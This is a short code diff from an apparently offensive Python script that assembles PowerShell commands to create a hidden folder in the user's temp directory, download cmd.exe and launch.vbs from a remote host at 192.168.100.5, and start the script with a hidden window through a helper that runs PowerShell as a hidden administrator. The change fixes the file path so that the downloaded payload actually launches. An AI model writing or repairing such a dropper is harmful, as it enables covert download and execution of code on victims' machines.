@@ -10,7 +10,7 @@ def main():
         'Set-ItemProperty -Path `"$env:Temp\\winsys`" -Name Attributes -Value `"Hidden`"',
         'Invoke-WebRequest -Uri http://192.168.100.5/cmd.exe -OutFile `"$env:Temp\\winsys\\cmd.exe`"',
         'Invoke-WebRequest -Uri http://192.168.100.5/launch.vbs -OutFile `"$env:Temp\\winsys\\launch.vbs`"',
-        'Start-Process -FilePath `"$env:Temp\\launch.vbs`" -WindowStyle Hidden'
+        'Start-Process -FilePath `"$env:Temp\\winsys\\launch.vbs`" -WindowStyle Hidden'
     ]
     powershell_command = ";".join(commands)
     run_hidden_admin_powershell(powershell_command)
